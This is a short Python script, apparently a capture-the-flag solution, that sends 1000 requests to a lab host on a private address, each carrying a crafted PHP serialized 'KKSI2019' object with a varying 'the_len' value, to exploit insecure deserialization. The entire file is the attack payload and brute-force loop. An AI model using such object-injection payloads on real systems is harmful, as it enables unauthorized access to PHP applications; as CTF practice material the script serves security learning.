import requests

for i in range(1000):
    r = requests.get(
        "http://192.168.3.100:1002/?ctf=O:8:'KKSI2019':5:{s:6:'status';s:1:'a';s:8:'function';s:1:'a';s:8:'argument';s:1:'a';s:7:'the_len';i:{};s:6:'hidden';s:1:'a';}".format(i))

print(r.text)
